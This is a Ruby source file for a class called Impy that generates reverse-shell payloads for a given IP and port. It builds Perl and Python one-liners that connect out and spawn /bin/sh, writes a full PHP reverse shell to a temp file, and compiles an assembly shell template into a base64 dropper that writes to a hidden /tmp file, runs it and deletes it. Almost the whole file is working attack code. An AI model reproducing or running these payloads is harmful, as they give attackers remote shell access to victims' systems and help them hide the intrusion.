require "ipaddr"
require 'base64'
require 'securerandom'

class Impy
    def initialize(filename = "shell.asm")
        @filename = filename
        @asm = ""
        @ip = "127.0.0.1"
        @port = "4444"
    end

    def openTemplate()
        @asm = File.open(@filename, "r").read()
    end

    def hexFormatIp(ip)
        ipArr = Array.new

        for i in 0 .. 3
            current = ip.split(".")[i]
            ipArr.push "#{current.to_i.to_s(16).rjust(2, '0').scan(/.{1,2}/).join}"
        end

        endian = ipArr.join.scan(/(..)(..)(..)(..)/).map(&:reverse).join

        final = ""

        if endian[0] == "0"
            final = "0x#{endian[1..-1]}"
        else
            final = "0x#{endian}"
        end

        return final
    end

    def hexFormatPort(port)
        port = port.to_i.to_s(16).rjust(4, '0').scan(/.{1,2}/)
 
        hexFormatted = Array.new

        for element in port
            hexFormatted.push "#{element}" # \x format
        end

        final = ""
        endian = hexFormatted.reverse.join

        if endian[0] == "0"
            final = "0x#{endian[1..-1]}"
        else
            final = "0x#{endian}"
        end
        
        return final
    end

    def modifyASM(ip, port)
        @asm = ""
        openTemplate()

        ip = hexFormatIp(ip)
        port = hexFormatPort(port)

        @asm.gsub!("IPADDRESS", ip)
        @asm.gsub!("PORTNUMBER", port)
    end

    def compileToBase64()
        # Generate random identifier to avoid colissions
        random_str = SecureRandom.hex

        # Write ASM to tmp file
        tmp = File.open(".tmp.#{random_str}", "w")
        @asm.split("\n").each do |line|
            tmp.write(line+"\n")
        end
        tmp.close()

        sleep 1

        # Compile ASM to Binary
        `nasm -o .tmp.compiled.#{random_str} .tmp.#{random_str}`

        sleep 1

        # Read binary and convert to base64
        base64 = Base64.strict_encode64(File.open(".tmp.compiled.#{random_str}", "rb").read)
        
        File.delete("./.tmp.#{random_str}") if File.exist?("./.tmp.#{random_str}")
        File.delete("./.tmp.compiled.#{random_str}") if File.exist?("./.tmp.compiled.#{random_str}")

        return base64
    end

    def perlPayload(ip, port)
        output = ""
        good_ip = false
        good_port = false

        begin
            test = IPAddr.new(ip)
            good_ip = true
        rescue => e
            output += "Something went wrong with IP, #{e.to_s}\n"
        end

        begin
            if port.to_i > 0 and port.to_i < 65535
                good_port = true
            else
                output += "Port is invalid\n"
            end
        rescue => e
            output += "Something went wrong with port #{e.to_}\n"
        end
        if good_ip and good_port
            payload = "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            output += payload
        else
            output += "Something is wrong with port or ip"
        end
        return output
    end

    def pythonPayload(ip, port)
        output = ""
        good_ip = false
        good_port = false

        begin
            test = IPAddr.new(ip)
            good_ip = true
        rescue => e
            output += "Something went wrong with IP, #{e.to_s}\n"
        end

        begin
            if port.to_i > 0 and port.to_i < 65535
                good_port = true
            else
                output += "Port is invalid\n"
            end
        rescue => e
            output += "Something went wrong with port #{e.to_}\n"
        end
        if good_ip and good_port
            payload = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            output += payload
        else
            output += "Something is wrong with port or ip"
        end
        return output
    end
    def phpPayload(ip, port)
        output = ""
        good_ip = false
        good_port = false

        begin
            test = IPAddr.new(ip)
            good_ip = true
        rescue => e
            output += "Something went wrong with IP, #{e.to_s}\n"
        end

        begin
            if port.to_i > 0 and port.to_i < 65535
                good_port = true
            else
                output += "Port is invalid\n"
            end
        rescue => e
            output += "Something went wrong with port #{e.to_}\n"
        end
        if good_ip and good_port
            payload = "<?php set_time_limit(0);$VERSION=\"1.0\";$ip='#{ip}';$port=#{port};$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit(\"ERROR: Can't fork\");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit(\"Error: Can't setsid()\");exit(1);}$daemon=1;}else {printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit(\"$errstr ($errno)\");exit(1);}$descriptorspec=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit(\"ERROR: Can't spawn shell\");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit(\"Successfully opened reverse shell to $ip:$port\");while(1){if(feof($sock)){printit(\"ERROR: Shell connection terminated\");break;}if(feof($pipes[1])){printit(\"ERROR: Shell process terminated\");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug)printit(\"SOCK READ\");$input=fread($sock,$chunk_size);if($debug)printit(\"SOCK: $input\");fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){if($debug)printit(\"STDOUT READ\");$input=fread($pipes[1],$chunk_size);if($debug)printit(\"STDOUT: $input\");fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){if($debug)printit(\"STDERR READ\");$input=fread($pipes[2],$chunk_size);if($debug)printit(\"STDERR: $input\");fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print\"$string\\n\";}}?>"
            
            tmp = Tempfile.new(['shell', ".php"])
            tmp.write(payload)
            tmp.close()
            output = File.open(tmp.path, "r")
        else
            output += "Something is wrong with port or ip"
        end
        return output
    end

    def genPayload(ip, port)
        output = ""

        good_ip = false
        good_port = false

        begin
            test = IPAddr.new(ip)
            good_ip = true
        rescue => e
            output += "Something went wrong with IP, #{e.to_s}\n"
        end

        begin
            if port.to_i > 0 and port.to_i < 65535
                good_port = true
            else
                output += "Port is invalid\n"
            end
        rescue => e
            output += "Something went wrong with port #{e.to_}\n"
        end

        if good_ip and good_port
            begin
                modifyASM(ip, port)
                sleep 0.1
                base64 = compileToBase64()
                output += "base64 -d <<< #{base64} > /tmp/.0; chmod +x /tmp/.0; /tmp/.0 &; rm -f /tmp/.0"
            rescue => e
                output += "Something went wrong. #{e.to_s}\n"
            end 
        else
            output += "IP or Port is bad. Please check it.\n"
        end

        return output
    end

end

# impy = Impy.new('shell.asm')
# puts impy.genPayload("127.0.0.1", "8080")
